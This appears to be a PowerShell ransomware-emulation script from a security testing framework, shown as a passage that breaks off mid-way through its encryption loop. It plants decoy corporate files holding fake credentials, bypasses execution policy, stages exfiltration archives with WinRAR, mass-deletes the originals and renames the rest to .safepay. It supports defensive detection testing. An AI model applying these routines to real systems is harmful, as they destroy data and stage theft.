# SafePay Ransomware Simulation Script - Enhanced Version with Comprehensive Logging
# Part of F0RT1KA Security Testing Framework
# Author: James Pichardo
# Version: 2.0 - Added detailed logging functionality
# August 2025

# Global variables for logging
$script:LogFile = "C:\F0\safepay_simulation.log"
$script:StartTime = Get-Date

# Function to write to both console and log file
function Write-SimulationLog {
    param(
        [string]$Message,
        [string]$Level = "INFO",
        [string]$Color = "White"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
    $logEntry = "[$timestamp] [$Level] $Message"
    
    # Write to log file
    try {
        Add-Content -Path $script:LogFile -Value $logEntry -ErrorAction SilentlyContinue
    } catch {
        # Silently fail if can't write to log
    }
    
    # Write to console with color
    $prefix = switch ($Level) {
        "INFO"    { "[*]" }
        "SUCCESS" { "[+]" }
        "WARNING" { "[!]" }
        "ERROR"   { "[!]" }
        "PHASE"   { "[PHASE]" }
        default   { "[*]" }
    }
    
    $consoleColor = switch ($Level) {
        "INFO"    { "Cyan" }
        "SUCCESS" { "Green" }
        "WARNING" { "Yellow" }
        "ERROR"   { "Red" }
        "PHASE"   { "Magenta" }
        default   { $Color }
    }
    
    Write-Host "$prefix $Message" -ForegroundColor $consoleColor
}

# Function to log phase transitions
function Write-PhaseLog {
    param([string]$PhaseName, [string]$Status = "STARTED")
    
    Write-SimulationLog "============================================" "PHASE"
    Write-SimulationLog "$PhaseName - $Status" "PHASE"
    Write-SimulationLog "============================================" "PHASE"
}

# Function to check admin privileges
function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if ($isAdmin) {
        Write-SimulationLog "Administrator privileges detected" "SUCCESS"
    } else {
        Write-SimulationLog "Running without administrator privileges" "WARNING"
    }
    
    return $isAdmin
}

# Function to bypass execution policy
function Set-ExecutionPolicyBypass {
    try {
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
        Write-SimulationLog "Execution policy bypass successful" "SUCCESS"
        return $true
    } catch {
        Write-SimulationLog "Failed to bypass execution policy: $_" "ERROR"
        return $false
    }
}

# Function to check available disk space (safety measure)
function Test-DiskSpace {
    param([string]$DriveLetter = "C")
    try {
        $drive = Get-WmiObject -Class Win32_LogicalDisk -Filter "DeviceID='${DriveLetter}:'"
        $freeSpaceGB = [math]::Round($drive.FreeSpace / 1GB, 2)
        Write-SimulationLog "Available disk space: ${freeSpaceGB}GB" "INFO"
        
        if ($freeSpaceGB -ge 2.0) {
            Write-SimulationLog "Disk space check passed (minimum 2GB required)" "SUCCESS"
            return $true
        } else {
            Write-SimulationLog "Insufficient disk space (minimum 2GB required)" "ERROR"
            return $false
        }
    } catch {
        Write-SimulationLog "Failed to check disk space: $_" "ERROR"
        return $false
    }
}

# Function to create realistic corporate file tree
function New-CorporateFileTree {
    param([string]$BasePath)
    
    Write-PhaseLog "DIRECTORY STRUCTURE CREATION" "STARTED"
    Write-SimulationLog "Creating realistic corporate directory structure at: $BasePath" "INFO"
    
    $directories = @(
        "Documents\Finance\Reports\Q1_2024",
        "Documents\Finance\Reports\Q2_2024", 
        "Documents\Finance\Budgets\2024",
        "Documents\Finance\Audits\Internal",
        "Documents\HR\Employees\Active",
        "Documents\HR\Employees\Terminated", 
        "Documents\HR\Payroll\2024",
        "Documents\Legal\Contracts\Active",
        "Documents\Legal\Contracts\Archive",
        "Documents\Legal\Compliance",
        "Documents\IT\Backups\Database",
        "Documents\IT\Backups\System",
        "Documents\IT\Credentials",
        "Desktop\Sales\Leads\2024",
        "Desktop\Sales\Customers\Active", 
        "Desktop\Sales\Proposals",
        "Desktop\Executive\Board",
        "Desktop\Executive\Strategy",
        "Pictures\Corporate"
    )
    
    $createdCount = 0
    $failedCount = 0
    
    foreach ($dir in $directories) {
        $fullPath = Join-Path $BasePath $dir
        try {
            New-Item -Path $fullPath -ItemType Directory -Force -ErrorAction Stop | Out-Null
            Write-SimulationLog "Created directory: $dir" "SUCCESS"
            $createdCount++
        } catch {
            Write-SimulationLog "Failed to create directory ${dir}: $_" "ERROR"
            $failedCount++
        }
    }
    
    Write-SimulationLog "Directory creation complete - Created: $createdCount, Failed: $failedCount" "INFO"
    Write-PhaseLog "DIRECTORY STRUCTURE CREATION" "COMPLETED"
}

# Function to generate realistic file content based on department
function Get-RealisticContent {
    param([string]$Department, [string]$Extension, [int]$SizeKB)
    
    $baseContent = ""
    $targetSize = $SizeKB * 1024
    
    switch ($Department) {
        "Finance" {
            $baseContent = @"
FINANCIAL REPORT - CONFIDENTIAL
Date: $(Get-Date -Format "yyyy-MM-dd")
Department: Finance Division

REVENUE ANALYSIS Q4 2024:
Product Line A: `$2,450,000 (15% increase YoY)
Product Line B: `$1,890,000 (8% increase YoY) 
Product Line C: `$3,200,000 (22% increase YoY)
International Sales: `$1,100,000 (5% decrease YoY)

EXPENSE BREAKDOWN:
Personnel Costs: `$1,850,000
Operations: `$890,000
Marketing: `$450,000
R&D Investment: `$780,000
Legal & Compliance: `$120,000

NET PROFIT MARGIN: 23.5%
EBITDA: `$2,100,000

BUDGET PROJECTIONS 2025:
Expected Revenue Growth: 18%
Capital Expenditure: `$1,200,000
Headcount Increase: 25 FTE

CONFIDENTIAL FINANCIAL METRICS:
Cash Flow Projection: `$850K monthly
Debt-to-Equity Ratio: 0.45
Working Capital: `$3.2M
"@
        }
        "HR" {
            $baseContent = @"
HUMAN RESOURCES DATABASE - RESTRICTED ACCESS
Generated: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")

EMPLOYEE RECORDS SUMMARY:
Total Active Employees: 847
New Hires Q4 2024: 23
Terminations Q4 2024: 8
Average Tenure: 4.2 years

SALARY INFORMATION:
Department,Average Salary,Bonus Pool,Stock Options
Engineering,`$125000,`$25000,5000
Sales,`$95000,`$45000,2500
Marketing,`$85000,`$15000,1500
Finance,`$110000,`$20000,2000
Legal,`$140000,`$30000,1000
Executive,`$275000,`$150000,25000

SENSITIVE HR DATA:
SSN Database Location: \\hr-server\secure\ssn_master.xlsx
Background Check Results: \\hr-server\bg_checks\2024\
Performance Reviews: \\hr-server\reviews\annual_2024\
Disciplinary Actions: 12 active cases
Workers Comp Claims: 3 pending

PAYROLL SCHEDULE:
Bi-weekly: Every other Friday
Direct Deposit: 98% participation
Benefits Enrollment: Open until Dec 15

COMPLIANCE NOTES:
EEOC Audit: Scheduled Q1 2025
Safety Training: 95% completion rate
Sexual Harassment Training: Mandatory refresh Q2 2025
"@
        }
        "Legal" {
            $baseContent = @"
LEGAL DEPARTMENT - ATTORNEY-CLIENT PRIVILEGE
Document Control #: LC-2024-$(Get-Random -Min 1000 -Max 9999)
Classification: HIGHLY CONFIDENTIAL

ACTIVE LITIGATION SUMMARY:
Case #2024-001: Patent Infringement vs. TechCorp Inc.
  Status: Discovery Phase
  Potential Exposure: `$15M
  Lead Attorney: Sarah Johnson, Esq.
  
Case #2024-002: Employment Discrimination Class Action  
  Status: Settlement Negotiations
  Potential Exposure: `$8.5M
  Lead Attorney: Michael Chen, Esq.

Case #2024-003: Contract Dispute - VendorX LLC
  Status: Mediation Scheduled
  Amount in Dispute: `$2.3M
  Lead Attorney: Jennifer Williams, Esq.

REGULATORY COMPLIANCE:
SEC Filing Status: Current (10-K submitted)
GDPR Compliance: 85% complete
SOX Audit: Scheduled Q1 2025
FDA Approval Process: Phase III trials ongoing

INTELLECTUAL PROPERTY PORTFOLIO:
Active Patents: 127
Pending Applications: 23
Trademarks Registered: 45
Trade Secrets Documentation: Vault Server \\legal\ts_vault\

CONTRACT MANAGEMENT:
Vendor Contracts: 234 active
Customer Agreements: 1,847 active
Partnership Deals: 12 active
Licensing Agreements: 67 active

CONFIDENTIAL MATTERS:
M&A Due Diligence: Project Phoenix (Target: CompetitorY)
Potential Acquisition Cost: `$250M
Due Date: March 2025
"@
        }
        "IT" {
            $baseContent = @"
IT SYSTEMS ADMINISTRATION - INTERNAL USE ONLY
System Status Report: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Security Classification: CONFIDENTIAL

INFRASTRUCTURE OVERVIEW:
Physical Servers: 45 active
Virtual Machines: 234 deployed
Cloud Instances: 67 (AWS), 23 (Azure)
Network Devices: 89 switches, 12 routers
Storage Capacity: 850TB total, 67% utilized

CRITICAL SYSTEM CREDENTIALS:
Domain Admin: admin@corp.local / TempPass123!
SQL Server SA: sa / DatabaseSecure2024#
Oracle DBA: oracle_admin / OracleDB!2024
VMware vCenter: vcenter-admin / VMware@2024
AWS Root: aws-root@corp.com / AWSSecure2024!
Backup System: backup-svc / BackupPass789#

DATABASE SERVERS:
PROD-SQL-01: Customer Database (847,000 records)
PROD-SQL-02: Financial Database (RESTRICTED)  
PROD-SQL-03: HR Database (Employee PII)
DEV-SQL-01: Development Environment
DR-SQL-01: Disaster Recovery Site

BACKUP SCHEDULE:
Full Backup: Sundays 2:00 AM
Incremental: Daily 11:00 PM  
Log Shipping: Every 15 minutes
Offsite Replication: Weekly to DR site

SECURITY INCIDENTS Q4 2024:
Failed Login Attempts: 12,547
Malware Detections: 23 (all quarantined)
Phishing Attempts: 156 blocked
Data Exfiltration Attempts: 2 (under investigation)

PATCH STATUS:
Windows Servers: 92% current
Linux Systems: 87% current  
Network Devices: 78% current
Security Appliances: 95% current

VPN ACCESS LOGS:
Active Connections: 245
Failed Authentications: 1,234 (last 24h)
Suspicious IPs Blocked: 89

PRIVILEGED ACCESS:
Administrator Accounts: 23 active
Service Accounts: 67 configured
Shared Accounts: 12 (scheduled for removal)
"@
        }
        "Sales" {
            $baseContent = @"
SALES DEPARTMENT - CONFIDENTIAL CUSTOMER DATA
Report Generated: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Access Level: Sales Management Only

Q4 2024 SALES PERFORMANCE:
Total Revenue: `$12,450,000
New Customer Acquisitions: 156
Customer Retention Rate: 94.2%
Average Deal Size: `$78,500
Sales Cycle Average: 89 days

TOP CUSTOMERS (CONFIDENTIAL):
MegaCorp Industries: `$2.1M annual contract
Global Solutions Ltd: `$1.8M annual contract  
TechGiant Inc: `$1.5M annual contract
Enterprise Systems: `$1.2M annual contract
Innovation Partners: `$950K annual contract

SALES PIPELINE Q1 2025:
Qualified Leads: 234
Opportunities in Progress: 89
Expected Close Value: `$15.2M
Probability-Weighted Pipeline: `$8.7M

CUSTOMER DATABASE EXCERPT:
Customer ID,Company,Contact,Phone,Email,Contract Value
CUS-001,Fortune500Corp,John Smith,555-0123,j.smith@f500.com,`$2100000
CUS-002,TechStartup LLC,Jane Doe,555-0456,jane@startup.com,`$450000
CUS-003,GlobalManuf Inc,Bob Johnson,555-0789,bob@global.com,`$1800000

COMMISSION STRUCTURE:
Base Commission: 8% of deal value
Accelerator Tier 1: 10% (>120% quota)
Accelerator Tier 2: 12% (>150% quota)  
SPIFs Active: New Logo Bonus (`$5K per deal)

SALES TERRITORIES:
North America East: `$4.2M quota
North America West: `$3.8M quota
EMEA: `$2.1M quota
APAC: `$1.9M quota
Latin America: `$450K quota

COMPETITIVE INTELLIGENCE:
CompetitorX losing market share (down 15%)
CompetitorY aggressive pricing strategy
CompetitorZ acquired by private equity

CRM SYSTEM ACCESS:
Salesforce.com Production: salesforce.corp.com
API Keys: sk_live_abc123xyz789
Integration Credentials: sfdc_api / SFDCpass2024!
"@
        }
        "Executive" {
            $baseContent = @"
EXECUTIVE BOARD MATERIALS - BOARD EYES ONLY
Board Meeting Date: $(Get-Date -Format "yyyy-MM-dd")  
Classification: TOP SECRET - BOARD CONFIDENTIAL

STRATEGIC INITIATIVES 2025:
1. ACQUISITION STRATEGY - PROJECT PHOENIX
   Target: CompetitorY Technologies
   Valuation: `$450M - `$650M range
   Strategic Rationale: Market consolidation + IP portfolio
   Timeline: Letter of Intent Q1 2025
   Lead: CEO, CFO, Head of Corp Dev

2. NEW PRODUCT LAUNCH - PROJECT TITAN  
   Investment Required: `$75M over 18 months
   Market Opportunity: `$2.8B addressable market
   Competitive Advantage: AI-driven automation
   Expected ROI: 340% over 5 years

3. INTERNATIONAL EXPANSION
   Target Markets: Germany, Japan, Australia
   Investment: `$25M initial setup
   Timeline: Q2 2025 market entry
   Local Partnerships: 3 signed LOIs

EXECUTIVE COMPENSATION 2025:
CEO Base Salary: `$850,000 (+7% from 2024)
CEO Performance Bonus: Up to `$1.2M (based on EBITDA)
CEO Equity Grant: 75,000 stock options
CFO Total Package: `$650K base + equity
CTO Retention Package: `$1.1M (counter-offer to Meta)

BOARD COMPOSITION:
Independent Directors: 6
Management Directors: 3  
Committee Structure: Audit, Compensation, Strategy
Next Board Election: Annual Meeting May 2025

CONFIDENTIAL BOARD MATTERS:
1. CEO Succession Planning (5-year horizon)
2. Activist Investor Response Strategy
3. ESG Initiative Funding (`$10M allocation)
4. Cybersecurity Insurance Renewal (`$25M coverage)

FINANCIAL PERFORMANCE TARGETS:
Revenue Growth: 25% YoY target
EBITDA Margin: Maintain 22%+ 
Cash Generation: `$50M+ annual FCF
Market Cap Goal: `$2B by end of 2025

MATERIAL NON-PUBLIC INFORMATION:
- Patent approval expected Q2 2025 (breakthrough technology)
- Government contract award pending (`$45M value)
- Strategic partnership with Fortune 10 company (under NDA)
- Potential IPO preparation timeline: 18-24 months

RISK FACTORS:
Regulatory changes in key markets
Supply chain disruption potential  
Key personnel retention challenges
Competitive pressure intensifying
"@
        }
        default {
            $baseContent = @"
CORPORATE DOCUMENT - INTERNAL USE
Generated: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Department: General
Classification: Internal

This document contains proprietary and confidential information
belonging to the company. Unauthorized distribution is prohibited.

Document Contents:
- Business processes and procedures
- Internal communications and memoranda  
- Strategic planning documents
- Operational data and metrics
- Customer and vendor information
- Financial and accounting records

For questions regarding this document, contact:
Document Control Office
Phone: (555) 123-4567
Email: doccontrol@company.com

CONFIDENTIAL - DO NOT DISTRIBUTE
"@
        }
    }
    
    # Pad content to reach target size
    while ($baseContent.Length -lt $targetSize) {
        $padding = @"


ADDITIONAL CONFIDENTIAL DATA - PADDING
========================================
Transaction ID: $(Get-Random -Min 100000 -Max 999999)
Timestamp: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff")
Data Classification: Confidential
Access Level: Authorized Personnel Only

This section contains additional proprietary information
that is critical to business operations and must be
protected according to company data classification policies.

Security Notice: This document is monitored for unauthorized access.
Any attempts to copy, modify, or distribute this content
without proper authorization will be logged and investigated.

Business Critical Information:
- Strategic planning data
- Competitive intelligence  
- Customer relationship details
- Financial performance metrics
- Operational procedures
- Technical specifications
- Personnel information
- Vendor agreements
- Regulatory compliance data
- Intellectual property details

"@
        $baseContent += $padding
    }
    
    # Trim to exact size if needed
    if ($baseContent.Length -gt $targetSize) {
        $baseContent = $baseContent.Substring(0, $targetSize)
    }
    
    return $baseContent
}

# Function to create realistic files with proper content
function New-RealisticCorporateFiles {
    param(
        [string]$BasePath,
        [int]$FilesPerDirectory = 30,
        [int]$MinSizeKB = 5,
        [int]$MaxSizeKB = 10
    )
    
    Write-PhaseLog "FILE GENERATION" "STARTED"
    Write-SimulationLog "Generating realistic corporate files in: $BasePath" "INFO"
    Write-SimulationLog "Parameters: FilesPerDirectory=$FilesPerDirectory, SizeRange=${MinSizeKB}KB-${MaxSizeKB}KB" "INFO"
    
    $extensions = @(".docx", ".xlsx", ".pdf", ".txt", ".pptx", ".sql", ".bak", ".csv", ".ppt", ".doc", ".zip")
    $departments = @("Finance", "HR", "Legal", "IT", "Sales", "Executive")
    $docTypes = @("Report", "Analysis", "Proposal", "Database", "Backup", "Contract", "Memo", "Presentation", "Spreadsheet", "Archive")
    
    $totalFiles = 0
    $maxFiles = 1500  # Safety limit
    $fileList = @()
    
    # Get all directories under base path
    $directories = Get-ChildItem -Path $BasePath -Directory -Recurse
    
    foreach ($directory in $directories) {
        if ($totalFiles -ge $maxFiles) {
            Write-SimulationLog "Reached maximum file limit ($maxFiles) for safety" "WARNING"
            break
        }
        
        $dept = ($departments | Where-Object { $directory.FullName -like "*$_*" } | Select-Object -First 1)
        if (-not $dept) { $dept = "General" }
        
        $filesToCreate = [Math]::Min($FilesPerDirectory, ($maxFiles - $totalFiles))
        
        for ($i = 1; $i -le $filesToCreate; $i++) {
            $extension = $extensions | Get-Random
            $docType = $docTypes | Get-Random
            $date = (Get-Date).AddDays(-(Get-Random -Min 1 -Max 365)).ToString("yyyy-MM-dd")
            $version = "v$(Get-Random -Min 1 -Max 9)"
            
            $fileName = "${dept}_${docType}_${date}_${version}${extension}"
            $filePath = Join-Path $directory.FullName $fileName
            
            $sizeKB = Get-Random -Min $MinSizeKB -Max $MaxSizeKB
            $content = Get-RealisticContent -Department $dept -Extension $extension -SizeKB $sizeKB
            
            try {
                Set-Content -Path $filePath -Value $content -ErrorAction Stop
                $totalFiles++
                $fileList += @{
                    Path = $filePath
                    Name = $fileName
                    Size = $sizeKB
                    Department = $dept
                }
                
                if ($totalFiles % 50 -eq 0) {
                    Write-SimulationLog "Created $totalFiles files..." "INFO"
                }
            } catch {
                Write-SimulationLog "Failed to create ${fileName}: $_" "ERROR"
            }
        }
    }
    
    Write-SimulationLog "File generation complete. Total files created: $totalFiles" "SUCCESS"
    Write-SimulationLog "Departments covered: $($departments -join ', ')" "INFO"
    Write-SimulationLog "Extensions used: $($extensions -join ', ')" "INFO"
    Write-PhaseLog "FILE GENERATION" "COMPLETED"
    
    return $totalFiles
}

# Function to execute multi-phase compression operations
function Invoke-MultiPhaseCompression {
    param(
        [string]$BasePath,
        [string]$WinRARPath
    )
    
    Write-PhaseLog "MULTI-PHASE COMPRESSION" "STARTED"
    Write-SimulationLog "Starting multi-phase compression operations" "INFO"
    
    if (-not (Test-Path $WinRARPath)) {
        Write-SimulationLog "WinRAR not found at: $WinRARPath" "ERROR"
        return $false
    }
    
    $compressionLog = @()
    
    # Phase 1: Department-level archives
    Write-SimulationLog "Phase 1: Creating department-level archives" "INFO"
    $departments = @("Finance", "HR", "Legal", "IT", "Sales", "Executive")
    
    foreach ($dept in $departments) {
        $deptPath = Get-ChildItem -Path $BasePath -Directory -Recurse | Where-Object { $_.FullName -like "*$dept*" } | Select-Object -First 1
        if ($deptPath) {
            $archiveName = "${dept}_Archive_$(Get-Date -Format 'yyyyMMdd').rar"
            $archivePath = Join-Path $BasePath $archiveName
            
            $rarArgs = @(
                "a",                    # Add to archive
                "-r",                   # Recurse subdirectories
                "-m3",                  # Good compression
                "-mt4",                 # Use 4 threads
                "-ep1",                 # Exclude base folder
                $archivePath,
                "$($deptPath.FullName)\*"
            )
            
            try {
                Write-SimulationLog "Archiving $dept department to: $archiveName" "INFO"
                $process = Start-Process -FilePath $WinRARPath -ArgumentList $rarArgs -Wait -PassThru -NoNewWindow
                if ($process.ExitCode -eq 0) {
                    Write-SimulationLog "$dept archive created successfully: $archivePath" "SUCCESS"
                    $compressionLog += @{
                        Archive = $archiveName
                        Department = $dept
                        Status = "Success"
                        Phase = 1
                    }
                } else {
                    Write-SimulationLog "$dept archive failed with exit code: $($process.ExitCode)" "ERROR"
                    $compressionLog += @{
                        Archive = $archiveName
                        Department = $dept
                        Status = "Failed"
                        Phase = 1
                        ExitCode = $process.ExitCode
                    }
                }
            } catch {
                Write-SimulationLog "Failed to archive ${dept}: $_" "ERROR"
            }
            
            Start-Sleep -Seconds 1  # Brief pause between operations
        }
    }
    
    # Phase 2: Location-based archives (parallel processing simulation)
    Write-SimulationLog "Phase 2: Creating location-based archives" "INFO"
    $locations = @("Documents", "Desktop", "Pictures")
    
    $jobs = @()
    foreach ($location in $locations) {
        $locationPath = Join-Path $BasePath $location
        if (Test-Path $locationPath) {
            $archiveName = "${location}_Data_$(Get-Date -Format 'yyyyMMdd_HHmm').rar"
            $archivePath = Join-Path $BasePath $archiveName
            
            Write-SimulationLog "Starting background compression for $location" "INFO"
            
            # Start background job for parallel processing
            $job = Start-Job -ScriptBlock {
                param($WinRAR, $ArchivePath, $LocationPath, $Location)
                
                $rarArgs = @(
                    "a",
                    "-r", 
                    "-m5",              # Maximum compression
                    "-mt2",             # Use 2 threads per job
                    "-v100m",           # Split into 100MB volumes
                    $ArchivePath,
                    "$LocationPath\*"
                )
                
                try {
                    $process = Start-Process -FilePath $WinRAR -ArgumentList $rarArgs -Wait -PassThru -NoNewWindow
                    return @{
                        Location = $Location
                        ExitCode = $process.ExitCode
                        Success = ($process.ExitCode -eq 0)
                    }
                } catch {
                    return @{
                        Location = $Location
                        ExitCode = -1
                        Success = $false
                        Error = $_.Exception.Message
                    }
                }
            } -ArgumentList $WinRARPath, $archivePath, $locationPath, $location
            
            $jobs += $job
            
            $compressionLog += @{
                Archive = $archiveName
                Location = $location
                Status = "Started"
                Phase = 2
            }
        }
    }
    
    # Wait for all compression jobs to complete
    if ($jobs.Count -gt 0) {
        Write-SimulationLog "Waiting for parallel compression jobs to complete..." "INFO"
        $jobs | Wait-Job | ForEach-Object {
            $result = Receive-Job $_
            if ($result.Success) {
                Write-SimulationLog "$($result.Location) compression completed successfully" "SUCCESS"
            } else {
                Write-SimulationLog "$($result.Location) compression failed (Exit Code: $($result.ExitCode))" "ERROR"
            }
            Remove-Job $_
        }
    }
    
    # Phase 3: Master exfiltration archive
    Write-SimulationLog "Phase 3: Creating master exfiltration archive" "INFO"
    $masterArchiveName = "EXFIL_Master_$(Get-Date -Format 'yyyyMMdd_HHmm').rar"
    $masterArchivePath = Join-Path $BasePath $masterArchiveName
    
    $masterArgs = @(
        "a",
        "-r",
        "-m0",                  # No compression for speed
        "-v500m",               # Split into 500MB volumes
        "-ed",                  # Do not add empty directories
        "-x*.rar",              # Exclude existing RAR files
        $masterArchivePath,
        "$BasePath\*"
    )
    
    try {
        Write-SimulationLog "Creating master exfiltration archive: $masterArchiveName" "INFO"
        $process = Start-Process -FilePath $WinRARPath -ArgumentList $masterArgs -Wait -PassThru -NoNewWindow
        if ($process.ExitCode -eq 0) {
            Write-SimulationLog "Master exfiltration archive created successfully" "SUCCESS"
            $compressionLog += @{
                Archive = $masterArchiveName
                Type = "Master"
                Status = "Success"
                Phase = 3
            }
        } else {
            Write-SimulationLog "Master archive creation failed with exit code: $($process.ExitCode)" "ERROR"
            $compressionLog += @{
                Archive = $masterArchiveName
                Type = "Master"
                Status = "Failed"
                Phase = 3
                ExitCode = $process.ExitCode
            }
        }
    } catch {
        Write-SimulationLog "Failed to create master archive: $_" "ERROR"
    }
    
    # Log compression summary
    Write-SimulationLog "Compression operations summary:" "INFO"
    $compressionLog | ForEach-Object {
        Write-SimulationLog "  - $($_.Archive): $($_.Status)" "INFO"
    }
    
    Write-PhaseLog "MULTI-PHASE COMPRESSION" "COMPLETED"
    return $true
}

# Function to perform mass deletion of original files
function Remove-OriginalFiles {
    param(
        [string]$BasePath,
        [array]$ExcludePatterns = @("*.rar", "*.safepay", "readme_safepay.txt", "*.log")
    )
    
    Write-PhaseLog "MASS DELETION" "STARTED"
    Write-SimulationLog "Starting mass deletion of original files" "WARNING"
    
    # Get all files except excluded patterns
    $filesToDelete = @()
    $deletionLog = @()
    
    foreach ($pattern in @("*.docx", "*.xlsx", "*.pdf", "*.txt", "*.pptx", "*.sql", "*.bak", "*.csv", "*.ppt", "*.doc", "*.zip")) {
        $files = Get-ChildItem -Path $BasePath -Filter $pattern -Recurse -File
        $filesToDelete += $files
    }
    
    # Filter out excluded files
    foreach ($excludePattern in $ExcludePatterns) {
        $filesToDelete = $filesToDelete | Where-Object { $_.Name -notlike $excludePattern }
    }
    
    Write-SimulationLog "Found $($filesToDelete.Count) files to delete" "INFO"
    
    # Delete files in batches for realistic ransomware behavior
    $batchSize = 100
    $deletedCount = 0
    $failedDeletions = @()
    
    for ($i = 0; $i -lt $filesToDelete.Count; $i += $batchSize) {
        $batch = $filesToDelete[$i..([Math]::Min($i + $batchSize - 1, $filesToDelete.Count - 1))]
        
        Write-SimulationLog "Secure deletion batch $(([Math]::Floor($i / $batchSize)) + 1) (files $($i+1)-$([Math]::Min($i + $batchSize, $filesToDelete.Count)))" "INFO"
        
        foreach ($file in $batch) {
            try {
                Remove-Item -Path $file.FullName -Force -ErrorAction Stop
                $deletedCount++
                $deletionLog += @{
                    FileName = $file.Name
                    FilePath = $file.FullName
                    Status = "Deleted"
                    Size = $file.Length
                }
                
                if ($deletedCount % 50 -eq 0) {
                    Write-SimulationLog "Deleted $deletedCount files..." "INFO"
                }
            } catch {
                Write-SimulationLog "Failed to delete $($file.Name): $_" "ERROR"
                $failedDeletions += $file.Name
                $deletionLog += @{
                    FileName = $file.Name
                    FilePath = $file.FullName
                    Status = "Failed"
                    Error = $_.Exception.Message
                }
            }
        }
        
        # Brief pause between batches to simulate realistic behavior
        Start-Sleep -Seconds 2
    }
    
    # Clean up empty directories
    Write-SimulationLog "Cleaning up empty directories..." "INFO"
    $removedDirs = 0
    do {
        $emptyDirs = Get-ChildItem -Path $BasePath -Directory -Recurse | Where-Object { 
            (Get-ChildItem -Path $_.FullName -Force | Measure-Object).Count -eq 0 
        }
        
        foreach ($dir in $emptyDirs) {
            try {
                Remove-Item -Path $dir.FullName -Force -ErrorAction Stop
                Write-SimulationLog "Removed empty directory: $($dir.Name)" "SUCCESS"
                $removedDirs++
            } catch {
                Write-SimulationLog "Failed to remove directory $($dir.Name): $_" "ERROR"
            }
        }
    } while ($emptyDirs.Count -gt 0)
    
    Write-SimulationLog "Mass deletion complete - Files deleted: $deletedCount, Failed: $($failedDeletions.Count), Directories removed: $removedDirs" "INFO"
    
    if ($failedDeletions.Count -gt 0) {
        Write-SimulationLog "Failed to delete the following files:" "WARNING"
        $failedDeletions | ForEach-Object {
            Write-SimulationLog "  - $_" "WARNING"
        }
    }
    
    Write-PhaseLog "MASS DELETION" "COMPLETED"
    return $deletedCount
}

# Main execution
Write-SimulationLog "================================================================================" "PHASE"
Write-SimulationLog "SafePay Ransomware Simulation - Enhanced Version with Logging Starting" "PHASE"
Write-SimulationLog "================================================================================" "PHASE"
Write-SimulationLog "Simulation started at: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" "INFO"
Write-SimulationLog "Log file location: $script:LogFile" "INFO"

# Write initial status for monitoring
"STARTED" | Out-File "C:\F0\status.txt" -Encoding ASCII

# Check admin privileges
$isAdmin = Test-Administrator

# Bypass execution policy
$policyBypassed = Set-ExecutionPolicyBypass

# Safety check: Verify disk space
if (-not (Test-DiskSpace)) {
    Write-SimulationLog "Insufficient disk space. Minimum 2GB required. Exiting." "ERROR"
    exit 1
}

# Set target directory to realistic user path
$targetDir = "C:\Users\fortika-test"
Write-SimulationLog "Target directory: $targetDir" "INFO"

# Create target directory structure
New-Item -Path $targetDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
Set-Location -Path $targetDir
Write-SimulationLog "Working directory set to: $targetDir" "INFO"

# Create realistic corporate file tree
New-CorporateFileTree -BasePath $targetDir

# Generate massive number of realistic corporate files
$filesCreated = New-RealisticCorporateFiles -BasePath $targetDir -FilesPerDirectory 25 -MinSizeKB 5 -MaxSizeKB 10
Write-SimulationLog "Created $filesCreated decoy files with realistic corporate content" "SUCCESS"

# Update status after file creation
"FILES_CREATED:$filesCreated" | Out-File "C:\F0\status.txt" -Encoding ASCII

# Wait for file generation to complete
Write-SimulationLog "Pausing for 5 seconds to allow file system to settle..." "INFO"
Start-Sleep -Seconds 5

# Execute multi-phase compression operations 
$winrarPath = "C:\F0\WinRAR.exe"  # WinRAR dropped by Go binary to F0
if (Test-Path $winrarPath) {
    $compressionResult = Invoke-MultiPhaseCompression -BasePath $targetDir -WinRARPath $winrarPath
    if ($compressionResult) {
        Write-SimulationLog "Multi-phase compression completed successfully" "SUCCESS"
        "COMPRESSION_DONE" | Out-File "C:\F0\status.txt" -Encoding ASCII
    } else {
        Write-SimulationLog "Multi-phase compression encountered errors" "WARNING"
        "COMPRESSION_ERROR" | Out-File "C:\F0\status.txt" -Encoding ASCII
    }
} else {
    Write-SimulationLog "WinRAR.exe not found at $winrarPath, skipping compression" "WARNING"
}

# Perform mass deletion of original files
Write-SimulationLog "Waiting 3 seconds before initiating mass deletion..." "INFO"
Start-Sleep -Seconds 3
$deletedCount = Remove-OriginalFiles -BasePath $targetDir

# Simulate file encryption on any remaining files
Write-PhaseLog "FILE ENCRYPTION" "STARTED"
Write-SimulationLog "Simulating final encryption phase on remaining files" "INFO"
$filesToEncrypt = Get-ChildItem -Path $targetDir -Include "*.xlsx","*.csv","*.txt","*.docx","*.pdf","*.pptx","*.sql","*.bak","*.ppt","*.doc","*.zip" -Recurse -File

$encryptedFiles = @()
$encryptionFailures = @()

if ($filesToEncrypt.Count -gt 0) {
    Write-SimulationLog "Found $($filesToEncrypt.Count) files remaining for encryption" "INFO"
    
    foreach ($file in $filesToEncrypt) {
        try {
            $encryptedName = $file.FullName + ".safepay"
            Write-SimulationLog "Encrypting file: $($file.FullName)" "INFO"
            
            # Simulate encryption by Base64 encoding
            $originalContent = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
            if ($originalContent) {
                $encryptedContent = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($originalContent))
                Set-Content -Path $encryptedName -Value $encryptedContent
                
                # Delete original file
                Remove-Item -Path $file.FullName -Force
                
                Write-SimulationLog "ENCRYPTED: $($file.Name) -> $($file.Name).safepay (Size: $([Math]::Round($file.Length/1KB, 2))KB)" "SUCCESS"
                
                $encryptedFiles += @{
                    OriginalName = $file.Name
                    OriginalPath = $file.FullName
                    EncryptedName = "$($file.Name).safepay"
                    EncryptedPath = $encryptedName
                    Size = $file.Length
